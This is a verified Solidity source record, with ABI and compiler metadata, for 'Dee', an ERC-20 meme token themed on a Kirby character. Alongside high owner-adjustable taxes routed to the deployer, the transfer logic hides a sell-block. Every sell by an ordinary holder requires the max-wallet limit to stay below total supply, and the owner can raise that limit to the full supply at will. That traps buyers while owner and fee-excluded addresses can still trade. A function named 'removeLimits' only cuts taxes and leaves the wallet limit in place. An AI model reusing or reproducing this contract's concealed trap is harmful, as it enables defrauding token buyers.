{"SourceCode": "//SPDX-License-Identifier: Unlicensed\r\n\r\n/**\r\n    $DEE is a character in the Kirby series.\r\n    He is a Waddle Dee who wears a blue bandana.\r\n    He has gone from being an insignificant, minor character in his first appearances to being a prominent figure who has appeared in almost every Kirby game.\r\n    \r\n    Learn More about $DEE:\r\n    Telegram: https://t.me/Dee_erc\r\n    Twitter: https://x.com/dee_token\r\n    Website: https://deerc.io\r\n\r\n         \u2800\u2880\u2834\u281a\u2809\u2809\u2811\u2826\u2834\u281a\u280b\u2809\u2812\u2884\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u28a0\u280b\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2838\u28c4\u2800\u2898\u2844\u28b7\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u28b8\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2809\u28cf\u2800\u28fc\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2808\u2887\u28b0\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u28a0\u280f\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2808\u28a3\u2873\u28c4\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u2874\u280b\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2819\u2822\u28d5\u2822\u2884\u2880\u2860\u2816\u280b\u2800\u2800\u2800\u2800\u2800\u2800\r\n    \u2800\u2800\u28e0\u2874\u2812\u2826\u28c4\u2800\u2800\u2800\u2809\u2809\u2801\u2800\u2800\u28c0\u2864\u2824\u2884\u2840\u2800\u2800\r\n    \u2880\u285e\u2801\u2800\u2800\u2800\u2808\u281b\u2809\u2809\u2809\u2809\u2809\u2809\u2832\u280f\u2800\u2800\u2800\u2818\u28a6\u2800\r\n    \u28b8\u2847\u2800\u2800\u2800\u2800\u2880\u2856\u28b3\u2800\u28e0\u283a\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2898\u2846\r\n    \u2800\u28bb\u2807\u2800\u2800\u2880\u28fe\u28f6\u284f\u2880\u28ff\u28f4\u2807\u2800\u2800\u2800\u2800\u2800\u2820\u2880\u287e\u2800\r\n    \u2800\u284f\u28a0\u2816\u2813\u287e\u28bf\u287f\u2800\u2838\u28ff\u28ff\u28a0\u2800\u2822\u28c4\u2800\u2800\u2800\u28bb\u2800\u2800\r\n    \u28b8\u2800\u2808\u281b\u281a\u2801\u2800\u2800\u283a\u2803\u2808\u2801\u2810\u2826\u28f4\u283f\u2800\u2800\u2800\u28b8\u2846\u2800\r\n    \u28b8\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28b8\u2803\u2800\r\n    \u2800\u28a7\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28fe\u2844\u2800\r\n    \u2800\u2808\u28f7\u2844\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u28a0\u281e\u2801\u28e7\u2800\r\n    \u2800\u2800\u286f\u2819\u2832\u28c4\u2840\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2880\u28e0\u2816\u280b\u2800\u2800\u285f\u2800\r\n    \u2800\u2800\u28b3\u28e4\u28a1\u28e4\u2809\u281b\u28f2\u2876\u2812\u2832\u28de\u281b\u2889\u28c0\u2800\u2800\u2800\u28fc\u2803\u2800\r\n    \u2800\u2800\u2800\u2819\u2813\u2827\u2834\u281a\u2809\u2800\u2800\u2800\u2819\u28a6\u28c0\u2808\u2801\u28c0\u2874\u280b\u2800\u2800\r\n    \u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2808\u2809\u2809\u2809\u2800\u2800\u2800\u2800\r\n    \u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\u263e\u22c6\uff61\ud81a\uddb9 \u00b0\u2729\r\n**/\r\n\r\npragma solidity 0.8.24;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract Dee is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    string private constant _name = unicode\"Waddle Dee\";\r\n    string private constant _symbol = unicode\"DEE\";\r\n    uint8 private constant _decimals = 18;\r\n    uint256 private constant _tTotal = 420e9 * 10 ** _decimals;\r\n    mapping (address => bool) private _excludedFromFee;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => uint256) private _balances;\r\n    bool public canTrade;\r\n    uint256 private _maxWalletSize = _tTotal * 2 / 100;\r\n    uint256 private _swapTokensAtAmount = _tTotal / 800;\r\n    uint256 private _maxTaxSwap = _tTotal / 100;\r\n    bool private inSwap;\r\n    bool private swapEnabled = true;\r\n    address payable public _marketingWallet;\r\n    IUniswapV2Router02 uniswapV2Router;\r\n    address private _uniswapV2Pair;\r\n    uint256 public _buyTax = 15;\r\n    uint256 public _sellTax = 25;\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n    constructor () {\r\n        _marketingWallet = payable(_msgSender());\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _excludedFromFee[address(uniswapV2Router)] = true;\r\n        _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        _excludedFromFee[address(this)] = true;\r\n        _excludedFromFee[msg.sender] = true;\r\n        _balances[msg.sender] = _tTotal;\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        uint256 taxAmount=0;\r\n        require(amount > 0);\r\n        if (!_excludedFromFee[from] && !_excludedFromFee[to] && from != owner() && to != owner()) {\r\n            require(canTrade);\r\n\r\n            taxAmount = amount * _buyTax / 100;\r\n\r\n            if (to != _uniswapV2Pair) {\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Over max wallet!\");\r\n            }\r\n\r\n            if(to == _uniswapV2Pair){\r\n                taxAmount = amount * _sellTax  / 100;\r\n                require(_maxWalletSize < _tTotal);\r\n            }\r\n\r\n            if (from == _uniswapV2Pair) {\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Over max wallet!\");\r\n            }\r\n\r\n            uint256 contractBalance = balanceOf(address(this));\r\n            if (!inSwap && to == _uniswapV2Pair && swapEnabled && contractBalance>_swapTokensAtAmount) {\r\n                swapTokensForEth(min(amount,min(contractBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                     _marketingWallet.transfer(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount > 0){\r\n          _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from] -= (amount);\r\n        _balances[to] += amount - taxAmount;\r\n        emit Transfer(from, to, amount - (taxAmount));\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function updateMaxWalletSize(uint amount) external onlyOwner {\r\n        require(amount >= _tTotal / 500);\r\n        _maxWalletSize = amount;\r\n    }\r\n\r\n    function setSwapEnabled(bool status) external onlyOwner {\r\n        swapEnabled = status;\r\n    }\r\n\r\n    function setSwapTokensAtAmount(uint amount) external onlyOwner {\r\n        _swapTokensAtAmount = amount;\r\n    }\r\n\r\n    function updateFees(uint __buyTax, uint __sellTax ) external onlyOwner {\r\n        _buyTax = __buyTax;\r\n        _sellTax  = __sellTax ;\r\n        require(__buyTax <= 30);\r\n        require(__sellTax  <= 30);\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        _buyTax = 2;\r\n        _sellTax = 2;\r\n    }\r\n\r\n    function DEE() external onlyOwner {\r\n        canTrade = true;\r\n    }\r\n\r\n    function excludeFromFees(address account, bool status) external onlyOwner {\r\n        _excludedFromFee[account] = status;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"DEE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_marketingWallet\",\"outputs\":[{\"internalType\":\"address payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"canTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"excludeFromFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setSwapEnabled\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setSwapTokensAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"__buyTax\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"__sellTax\",\"type\":\"uint256\"}],\"name\":\"updateFees\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"updateMaxWalletSize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Dee", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ac42273eca6677ac494839b69b7ef69c341cc3e6eb855109bee32b0a9ffb0700"}